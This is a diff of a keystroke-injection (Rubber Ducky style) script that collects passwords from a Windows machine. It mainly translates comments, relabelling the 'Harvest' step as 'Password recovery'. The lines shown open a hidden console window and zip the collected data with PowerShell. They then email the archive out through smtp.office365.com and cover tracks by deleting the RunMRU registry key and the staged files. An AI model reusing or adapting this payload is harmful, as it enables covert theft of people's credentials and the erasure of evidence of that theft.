@@ -1,5 +1,5 @@
-REM Based on the code of: Siem TTommy
-REM: Version 1.0
+REM Based on the code of @norepository
+REM: Version 1.0 in english
 REM *** Adapted by @fatouh4ck***
 DELAY 2000
 GUI d
@@ -11,7 +11,7 @@ ENTER
 DELAY 500
 STRING color FE & mode con:cols=18 lines=1
 ENTER
-REM --> Harvest
+REM --> Password recovery
 STRING cd Desktop
 ENTER
 STRING mkdir A
@@ -27,7 +27,7 @@ STRING powershell
 ENTER
 STRING Compress-Archive -Path A -DestinationPath A.zip
 ENTER
-REM --> Outlook SMTP
+REM --> Sending with Outlook SMTP
 DELAY 500
 STRING $SMTPServer = 'smtp.office365.com'
 ENTER
@@ -52,7 +52,7 @@ ENTER
 STRING $SMTPInfo.Send($ReportEmail)
 ENTER
 DELAY 400
-REM --> Clean up
+REM --> Clean-up
 STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
 ENTER
 STRING cd ..
@@ -66,10 +66,11 @@ ENTER
 DELAY 100
 STRING del C:\Users\Utilisateur\Desktop\A & rmdir C:\Users\Utilisateur\Desktop\A
 ENTER
-STRING O
+STRING Y
 ENTER
 STRING del C:\Users\Utilisateur\Desktop\A.zip & exit
 ENTER
+REM --> Everything went well (optional part)
 DELAY 500
 GUI r
 DELAY 400
